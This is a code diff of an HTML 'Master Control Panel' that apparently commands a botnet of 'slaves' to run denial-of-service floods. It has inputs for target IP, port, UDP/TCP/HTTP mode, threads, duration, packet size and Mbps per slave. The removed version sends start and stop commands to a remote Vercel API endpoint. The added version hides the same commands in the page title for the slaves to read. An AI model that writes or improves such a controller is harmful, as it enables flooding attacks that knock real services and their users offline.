@@ -2,99 +2,56 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Master Control</title>
+  <title>STOP|0|0|stop|0|0|0|0</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0f0f0f;
-      color: #0f0;
-      margin: 20px;
-      text-align: center;
-    }
-    h1 { color: #0f0; }
-    input, select, button {
-      padding: 10px;
-      margin: 8px;
-      font-size: 16px;
-      border-radius: 5px;
-    }
-    button {
-      background: #0f0;
-      color: black;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover { background: #00cc00; }
-    .stop { background: #ff4444; color: white; }
-    .info {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #aaa;
-    }
+    body { font-family: Arial; background: #111; color: #0f0; text-align: center; padding: 30px; }
+    input, select, button { padding: 12px; margin: 8px; font-size: 16px; }
+    button { font-weight: bold; }
+    .start { background: lime; color: black; }
+    .stop  { background: red; color: white; }
   </style>
 </head>
 <body>
-  <h1>🚀 Master Control Panel</h1>
-  <p><strong>Controller:</strong> https://iosdfj.vercel.app</p>
+  <h1>Static Master Control</h1>
 
-  <br>
   <input id="ip" placeholder="Target IP" value="127.0.0.1"><br>
   <input id="port" placeholder="Port" value="53" type="number"><br>
-  
   <select id="mode">
-    <option value="udp">UDP (L4)</option>
-    <option value="tcp">TCP Connect (L4)</option>
-    <option value="http">HTTP GET (L7)</option>
+    <option value="udp">UDP</option>
+    <option value="tcp">TCP</option>
+    <option value="http">HTTP</option>
   </select><br>
-
   <input id="threads" placeholder="Threads" value="25" type="number"><br>
-  <input id="duration" placeholder="Duration (seconds)" value="25" type="number"><br>
+  <input id="duration" placeholder="Duration (sec)" value="25" type="number"><br>
   <input id="psize" placeholder="Packet Size" value="1024" type="number"><br>
-  <input id="mbps" placeholder="Target Mbps per slave" value="4" type="number"><br>
+  <input id="mbps" placeholder="Mbps per slave" value="4" type="number"><br><br>
 
-  <br>
-  <button onclick="startAttack()">🚀 START ALL SLAVES</button>
-  <button class="stop" onclick="stopAttack()">⛔ STOP ALL SLAVES</button>
-
-  <div class="info">
-    <p>Status: <span id="status">Ready</span></p>
-  </div>
+  <button class="start" onclick="sendStart()">🚀 START ALL SLAVES</button>
+  <button class="stop" onclick="sendStop()">⛔ STOP ALL SLAVES</button>
 
   <script>
-    const apiUrl = "https://superdupertuff.vercel.app/api/command";
-
-    async function startAttack() {
-      const data = {
-        action: "start",
-        target_ip: document.getElementById('ip').value,
-        port: parseInt(document.getElementById('port').value),
-        mode: document.getElementById('mode').value,
-        threads: parseInt(document.getElementById('threads').value),
-        duration: parseInt(document.getElementById('duration').value),
-        packet_size: parseInt(document.getElementById('psize').value),
-        target_mbps: parseFloat(document.getElementById('mbps').value)
-      };
-
-      await fetch(apiUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
-
-      document.getElementById('status').innerHTML = '✅ <b>START</b> command sent!';
-      setTimeout(() => document.getElementById('status').innerHTML = 'Ready', 4000);
+    function updateTitle(action, ip, port, mode, threads, duration, psize, mbps) {
+      const title = `${action}|${ip}|${port}|${mode}|${threads}|${duration}|${psize}|${mbps}`;
+      document.title = title;
+      console.log("New Title Set:", title);
     }
 
-    async function stopAttack() {
-      await fetch(apiUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: "stop" })
-      });
+    function sendStart() {
+      const ip = document.getElementById('ip').value;
+      const port = document.getElementById('port').value;
+      const mode = document.getElementById('mode').value;
+      const threads = document.getElementById('threads').value;
+      const duration = document.getElementById('duration').value;
+      const psize = document.getElementById('psize').value;
+      const mbps = document.getElementById('mbps').value;
 
-      document.getElementById('status').innerHTML = '⛔ <b>STOP</b> command sent!';
-      setTimeout(() => document.getElementById('status').innerHTML = 'Ready', 4000);
+      updateTitle("START", ip, port, mode, threads, duration, psize, mbps);
+      alert("START command sent via page title!");
+    }
+
+    function sendStop() {
+      updateTitle("STOP", "0", "0", "stop", "0", "0", "0", "0");
+      alert("STOP command sent!");
     }
   </script>
 </body>
